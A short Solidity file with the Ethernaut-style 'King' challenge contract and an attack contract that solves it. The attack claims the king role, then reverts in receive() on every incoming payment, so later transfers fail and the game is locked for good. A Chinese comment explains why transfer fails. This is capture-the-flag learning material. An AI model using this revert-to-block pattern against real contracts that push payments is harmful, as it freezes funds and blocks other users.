pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract attack{
    constructor(address _addr) public payable{
        _addr.call{value : msg.value}("");
    }
    receive() external payable{
        revert();
    }
}

//当transfer在智能合约上调用时，该智能合约receive或fallback函数将执行。或者，如果这些都没有定义，那么该函数将失败。